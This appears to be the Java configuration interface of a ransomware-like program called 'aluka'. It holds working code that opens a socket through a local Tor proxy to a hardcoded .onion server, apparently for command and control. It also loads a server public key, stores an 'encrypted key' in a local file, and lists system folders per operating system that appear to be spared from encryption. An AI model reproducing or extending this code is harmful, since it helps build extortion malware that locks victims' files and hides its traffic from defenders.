package aluka.configuration;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Proxy.Type;
import java.net.Socket;
import java.security.PublicKey;
import java.util.Arrays;
import java.util.List;
import java.util.function.Supplier;
import java.util.logging.Level;

import aluka.core.LoggerManagement;

public interface Configuration {

	public final static short TAMPON = 1024;
	
	public static LoggerManagement logger = LoggerManagement.getInstance();
	
	public Socket getServerConnexion() throws IOException;

	public static PublicKey getServerPublicKey() {
		File file = new File("publicKey.obj");
		ObjectInputStream keyReader = null;
		PublicKey publicKey = null;
		try {
			keyReader = new ObjectInputStream(new FileInputStream(file));
			publicKey = (PublicKey) keyReader.readObject();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		} finally {
			try {
				keyReader.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return publicKey;

	}

	public static Socket getSilverTunnelConnexion() {
		try {
			Socket serverConnexion = new Socket(
					new Proxy(Type.SOCKS, new InetSocketAddress(InetAddress.getByName("localhost"), 9150)));
			serverConnexion.connect(
					new InetSocketAddress("bkivabygdqeqacosuf2xotcm233sq2ci5ts4wet6hzmpkpccalrhiaqd.onion", 45000));
			return serverConnexion;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static Socket getSimpleConnexion() {
		Socket socket;
		try {
			socket = new Socket(InetAddress.getByName("127.0.0.1"), 45000);
			return socket;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;
	}

	public static Supplier<List<String>> getLinuxCallback() {
		return new Supplier<List<String>>() {
			@Override
			public List<String> get() {
				return Arrays.asList("/dev", "/boot");
			}
		};
	}

	public static Supplier<List<String>> getMacosCallback() {
		return new Supplier<List<String>>() {
			@Override
			public List<String> get() {
				return Arrays.asList("/boot");
			}
		};
	}

	public static Supplier<List<String>> getWindowsCallback() {
		return new Supplier<List<String>>() {
			@Override
			public List<String> get() {
				return Arrays.asList("WINDOWS");
			}
		};
	}
	
	public static void waitForThreads(List<Thread> threads,String comment) {
		logger.log(Level.INFO, comment);
		boolean finished = true;
		do {
			finished = true;
			for(Thread t:threads) {
				if(t.isAlive()) {
					finished = false;
					break;
				}
			}
		}while(!finished);
	}
	
	public static void saveKey(String key) throws IOException{
		logger.log(Level.INFO, "Saving Encrypted key");
		File file = new File("key.aluka");
		if(!file.exists())
			file.createNewFile();
		BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file));
		bos.write(key.getBytes());
		bos.flush();
		bos.close();	
	}
	
	public static String loadKey() throws IOException{
		logger.log(Level.INFO, "Loading Encrypted key");
		File file = new File("key.aluka");
		BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
		int l;
		byte[] bytes = new byte[TAMPON];
		String key = "";
		while((l=bis.read(bytes)) > 0) {
			key += new String(bytes,0,l);
		}
		bis.close();
		return key;
	}

}
